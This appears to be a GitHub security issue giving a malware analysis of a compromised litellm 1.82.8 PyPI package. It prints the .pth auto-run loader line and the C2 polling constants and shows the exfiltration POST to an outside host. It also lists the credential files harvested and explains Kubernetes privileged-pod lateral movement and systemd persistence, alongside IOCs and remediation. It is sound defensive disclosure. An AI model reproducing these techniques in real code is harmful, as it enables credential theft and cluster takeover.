**GitHub Issue:** [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 — credential stealer via PyPI supply chain #24512 — https://github.com/BerriAI/litellm/issues/24512

# litellm 1.82.8 Supply Chain Compromise — Full Analysis

**Package:** `litellm==1.82.8` (PyPI)
**Date of analysis:** 2026-03-24
**Malicious file:** `litellm_init.pth` (34,628 bytes)
**Exfiltration endpoint:** `https://models.litellm.cloud/`
**C2 endpoint:** `https://checkmarx.zone/raw`

---

## Overview

This is a multi-stage supply chain attack embedded in the litellm PyPI package. The attack chain is:

```
.pth auto-trigger -> credential harvester -> encrypted exfil -> persistent backdoor + K8s worm
```

The `.pth` file mechanism is particularly insidious: Python automatically executes `.pth` files found in `site-packages` on **every interpreter startup**, meaning the malware runs without ever importing `litellm`.

---

## Stage 0: Trigger — `litellm_init.pth`

**File:** `litellm_init.pth`
**Mechanism:** Python `.pth` site-packages auto-execution

### How it works

When Python starts, it scans `site-packages` for `.pth` files. Lines starting with `import` are executed as code. The `.pth` file contains a single line:

```python
import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('...'))"])
```

This spawns a detached child process running the decoded Stage 1 payload. The parent Python process continues normally, making the attack invisible to the user.

### Key properties

- **No import required** — triggers on any `python` invocation, even `python --version`
- **Non-blocking** — uses `Popen` so the user's command runs normally
- **Listed in RECORD** — the malicious file is declared in the wheel's own metadata, passing hash verification

---

## Stage 1: Orchestrator — `decoded_payload.py`

**Purpose:** Decode and execute the credential collector, encrypt the output, and exfiltrate it.

### Components

1. **RSA-4096 public key** — hardcoded attacker public key for encrypting stolen data
2. **B64_SCRIPT** — base64-encoded Stage 2 credential collector
3. **`run()` function** — the orchestration logic

### Execution flow

```
1. Decode B64_SCRIPT (Stage 2) from base64
2. Execute it via `subprocess.run([python, "-"], input=payload, stdout=file)`
   - All collected data is written to stdout -> captured to a temp file
3. Generate a random 256-bit AES session key via `openssl rand`
4. Encrypt the collected data with AES-256-CBC (PBKDF2) using the session key
5. Encrypt the session key with the RSA-4096 public key (OAEP padding)
6. Bundle `payload.enc` + `session.key.enc` into `tpcp.tar.gz`
7. POST the bundle to https://models.litellm.cloud/ via curl
```

### Exfiltration details

```
POST https://models.litellm.cloud/
Content-Type: application/octet-stream
X-Filename: tpcp.tar.gz
Body: [AES-encrypted credentials + RSA-encrypted session key]
```

The hybrid encryption scheme means only the attacker (holding the RSA private key) can decrypt the stolen data.

---

## Stage 2: Credential Collector — `stage2_collector.py`

**Purpose:** Harvest every credential, secret, key, and sensitive file on the system.

This is the largest component (~330 lines). It outputs all collected data to stdout in a structured format (`=== /path/to/file ===` headers followed by file contents).

### Collection targets

#### System reconnaissance
| Target | Method |
|--------|--------|
| Hostname, user, OS | `hostname; whoami; uname -a` |
| Network interfaces | `ip addr` / `ifconfig` |
| Routing table | `ip route` |
| All environment variables | `printenv` |

#### SSH (lines 47-52)
- Private keys: `id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`
- `authorized_keys`, `known_hosts`, `config`
- All files under `~/.ssh/` (depth 2)
- Host keys from `/etc/ssh/ssh_host_*_key`

#### Git credentials (lines 54-55)
- `~/.git-credentials` (plaintext tokens)
- `~/.gitconfig`

#### Cloud provider credentials

**AWS (lines 57-59, 68-70, 199-240):**
- `~/.aws/credentials` and `~/.aws/config`
- Environment variables (`AWS_*`)
- ECS container credentials via `169.254.170.2` metadata endpoint
- EC2 IMDS v2 role credentials via `169.254.169.254` (implements full IMDSv2 token flow)
- AWS Secrets Manager — lists all secrets, attempts to retrieve values
- AWS SSM Parameter Store — lists all parameters

**GCP (lines 87-91):**
- `~/.config/gcloud/` directory (all files, depth 4)
- `application_default_credentials.json`
- `GOOGLE_APPLICATION_CREDENTIALS` environment variable and referenced file
- Environment variables (`GOOGLE_*`, `GCLOUD_*`)

**Azure (lines 93-95):**
- `~/.azure/` directory (all files, depth 3)
- Environment variables (`AZURE_*`)

#### Kubernetes (lines 72-85, 242-311)
- `~/.kube/config`
- Cluster configs: `admin.conf`, `kubelet.conf`, `controller-manager.conf`, `scheduler.conf`
- Service account tokens and CA certs from `/var/run/secrets/` and `/run/secrets/`
- All mounted secrets via `find /var/secrets /run/secrets`
- **Active API exploitation** (if SA token exists):
  - Lists all secrets across all namespaces via K8s API
  - Enumerates namespaces, then fetches secrets per namespace
  - **Deploys privileged pods to every node** (see Stage 2b below)

#### Environment files (lines 61-66)
- `.env`, `.env.local`, `.env.production`, `.env.development`, `.env.staging`, `.env.test`
- Searched in CWD, parent dirs, `/app/.env`, `/etc/environment`
- Recursive walk of all roots (depth 6) for any `.env*` files

#### Container & registry credentials (lines 97-100)
- `~/.docker/config.json` (contains registry auth tokens)
- `/kaniko/.docker/config.json` (CI/CD builder credentials)

#### Database credentials (lines 102-124)
- MySQL: `~/.my.cnf`, `/etc/mysql/my.cnf`
- PostgreSQL: `~/.pgpass`, `/var/lib/postgresql/.pgpass`
- MongoDB: `~/.mongorc.js`
- Redis: `/etc/redis/redis.conf`
- Environment variables matching `DATABASE|DB_|MYSQL|POSTGRES|MONGO|REDIS|VAULT`

#### Application & service credentials (lines 102-112)
- `~/.npmrc` (npm registry tokens)
- `~/.vault-token` (HashiCorp Vault)
- `~/.netrc` (FTP/HTTP basic auth)
- `~/.msmtprc` (SMTP credentials)
- LDAP configs: `/etc/ldap/ldap.conf`, `slapd.conf`
- Postfix SASL passwords

#### Shell history (lines 111-112)
- `.bash_history`, `.zsh_history`, `.sh_history`
- `.mysql_history`, `.psql_history`, `.rediscli_history`

#### VPN (lines 126-127)
- WireGuard configs from `/etc/wireguard/*.conf`
- `wg showconf all` output

#### Infrastructure as Code (lines 129-134)
- Helm charts: `~/.helm/` (depth 3)
- Terraform: `*.tfvars` files, `terraform.tfstate` (contains cloud credentials in plaintext)
- CI/CD configs: `.gitlab-ci.yml`, `.travis.yml`, `Jenkinsfile`, `.drone.yml`
- Ansible: `ansible.cfg`

#### TLS/SSL certificates and private keys (lines 136-138)
- `/etc/ssl/private/*.key`
- `/etc/letsencrypt/**/*.pem`
- All `.pem`, `.key`, `.p12`, `.pfx` files across all roots (depth 5)

#### API keys and webhooks (lines 140-141)
- Grep for Slack/Discord webhook URLs
- Grep for `api_key`, `api_secret`, `access_token` in `.env`, `.json`, `.yml`, `.yaml` files

#### Cryptocurrency wallets (lines 143-158)
- Bitcoin, Litecoin, Dogecoin, Zcash, Dash, Ripple, Monero configs
- Bitcoin `wallet*.dat` files
- Ethereum keystore
- Cardano signing/verification keys (`.skey`, `.vkey`)
- **Solana** — heavy focus:
  - `~/.config/solana/` (all files)
  - `validator-keypair.json`, `vote-account-keypair.json`, `authorized-withdrawer-keypair.json`
  - Searched in `/home/sol`, `/home/solana`, `/opt/solana`, `/solana`, `/app`, `/data`
  - Anchor framework: `.anchor/`, `target/deploy/`, `keys/` directories
  - Any `id.json`, `keypair.json`, `*-keypair.json`, `wallet*.json` (depth 8)
- Ledger hardware wallet exports

#### System access (lines 163-167)
- `/etc/passwd` and `/etc/shadow`
- Auth logs: successful SSH logins from `auth.log` and `secure`

### Stage 2b: Kubernetes lateral movement (lines 280-311)

If a K8s service account token is found, the malware **actively attacks the cluster**:

1. Enumerates all nodes via K8s API
2. For each node, creates a **privileged pod** in `kube-system` namespace:
   - Name: `node-setup-{node_name}`
   - Image: `alpine:latest`
   - `hostPID: true`, `hostNetwork: true`, `privileged: true`
   - Mounts the host root filesystem at `/host`
   - Tolerates all taints (runs on any node including control plane)
3. The pod drops Stage 3 persistence onto the host via chroot

This effectively turns a single compromised pod into full cluster compromise.

---

## Stage 3: Persistence Backdoor — `stage3_persistence.py`

**Purpose:** Maintain persistent access via a polling-based remote access agent.

### C2 mechanism

```python
C_URL = "https://checkmarx.zone/raw"    # C2 server
TARGET = "/tmp/pglog"                     # Downloaded payload path
STATE = "/tmp/.pg_state"                  # Tracks last downloaded URL
```

### Behavior

1. **Initial sleep:** 300 seconds (5 minutes) — avoids detection during install
2. **Polling loop** (every 3000 seconds / ~50 minutes):
   - Fetches a URL from `https://checkmarx.zone/raw`
   - If the URL is new (different from last download) and not a `youtube.com` link:
     - Downloads the binary to `/tmp/pglog`
     - Sets it executable (`chmod 755`)
     - Executes it in a detached session (`start_new_session=True`)
     - Records the URL in `/tmp/.pg_state`

### Persistence installation

The backdoor is installed in two ways:

**Local persistence (lines 313-331 of Stage 2):**
- Drops `sysmon.py` to `~/.config/sysmon/sysmon.py`
- Creates a systemd user service at `~/.config/systemd/user/sysmon.service`
- Service config: `Restart=always`, `RestartSec=10`, suppresses stdout/stderr
- Enables and starts via `systemctl --user enable --now sysmon.service`
- Masquerades as "System Telemetry Service"

**K8s node persistence (lines 284-291 of Stage 2):**
- Same dropper but via privileged pod chroot into host filesystem
- Uses system-level systemd (not user-level) on each K8s node

---

## Attack flow summary

```
pip install litellm==1.82.8
        |
        v
litellm_init.pth installed to site-packages
        |
        v
ANY python invocation (no import needed)
        |
        v
[Stage 1] Spawns background process
        |
        +---> [Stage 2] Collects ALL credentials on disk:
        |       - SSH keys, AWS/GCP/Azure creds, K8s secrets
        |       - .env files, DB passwords, TLS private keys
        |       - Crypto wallets (heavy Solana focus)
        |       - Docker configs, CI/CD secrets, shell history
        |       - IMDS metadata, Secrets Manager, SSM params
        |
        +---> [Stage 2] If K8s access available:
        |       - Dumps all cluster secrets
        |       - Deploys privileged pods to EVERY node
        |       - Drops Stage 3 on each node via chroot
        |
        +---> [Stage 2] Installs local persistence:
        |       - ~/.config/sysmon/sysmon.py (Stage 3)
        |       - systemd user service "sysmon.service"
        |
        +---> [Stage 1] Encrypts all collected data:
        |       - AES-256-CBC with random session key
        |       - Session key encrypted with RSA-4096 pubkey
        |
        +---> [Stage 1] Exfiltrates to https://models.litellm.cloud/
                - POST as tpcp.tar.gz
                - Only attacker can decrypt (holds RSA privkey)

[Stage 3] Runs persistently as systemd service:
        - Polls https://checkmarx.zone/raw every ~50 min
        - Downloads and executes arbitrary binaries
        - Provides ongoing remote code execution
```

---

## Indicators of Compromise (IOCs)

### Files
| Path | Description |
|------|-------------|
| `<site-packages>/litellm_init.pth` | Trigger file |
| `~/.config/sysmon/sysmon.py` | Persistence backdoor |
| `~/.config/systemd/user/sysmon.service` | Systemd persistence |
| `/tmp/pglog` | Downloaded C2 payload |
| `/tmp/.pg_state` | C2 state tracker |

### Network
| Indicator | Purpose |
|-----------|---------|
| `https://models.litellm.cloud/` | Credential exfiltration endpoint |
| `https://checkmarx.zone/raw` | C2 polling endpoint |
| `169.254.169.254` (IMDS) | AWS metadata credential theft |
| `169.254.170.2` (ECS) | ECS container credential theft |

### Kubernetes
| Indicator | Description |
|-----------|-------------|
| Pods named `node-setup-*` in `kube-system` | Lateral movement pods |
| Privileged alpine pods with host root mount | Persistence dropper |

### Systemd
| Indicator | Description |
|-----------|-------------|
| Service `sysmon.service` (user scope) | "System Telemetry Service" — persistence |

### Process
| Indicator | Description |
|-----------|-------------|
| `python3 -c "import base64; exec(...)"` | Stage 0 child process |
| `python3 ~/.config/sysmon/sysmon.py` | Stage 3 running |
| `/tmp/pglog` executing | C2 payload active |

---

## Remediation

1. **Uninstall immediately:** `pip uninstall litellm`
2. **Remove persistence:**
   ```bash
   systemctl --user stop sysmon.service
   systemctl --user disable sysmon.service
   rm -f ~/.config/sysmon/sysmon.py
   rm -f ~/.config/systemd/user/sysmon.service
   rm -f /tmp/pglog /tmp/.pg_state
   ```
3. **Rotate ALL credentials** on affected systems — SSH keys, cloud IAM, K8s tokens, API keys, DB passwords, registry tokens
4. **K8s clusters:** Delete `node-setup-*` pods in `kube-system`, check all nodes for persistence
5. **Audit:** Check auth logs for unauthorized access using stolen credentials
6. **Network:** Block `models.litellm.cloud` and `checkmarx.zone` at firewall/DNS level
